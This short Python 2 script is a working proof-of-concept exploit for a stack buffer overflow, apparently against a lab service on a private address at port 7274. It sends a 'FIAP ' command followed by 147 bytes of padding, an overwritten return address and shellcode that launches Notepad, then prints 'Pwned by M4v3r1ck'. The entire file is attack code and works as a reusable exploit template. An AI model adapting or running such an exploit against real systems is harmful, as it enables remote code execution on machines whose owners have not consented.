#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host="192.168.255.198"
port = 7274

offset = "A" * 147
eip = pack('<L', 0x72741F61)

shellcode =  ""
shellcode += "\x31\xc0\x50\x68\x65\x78\x65\x20\x68\x70\x61\x64\x2e"
shellcode += "\x68\x6e\x6f\x74\x65\x54\xb8\x4f\x1a\x74\x72\xff\xd0"



payload = offset + eip + shellcode

buffer  = "FIAP "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Pwned by M4v3r1ck..."
exp.recv(4096)
exp.send(buffer)
exp.close()

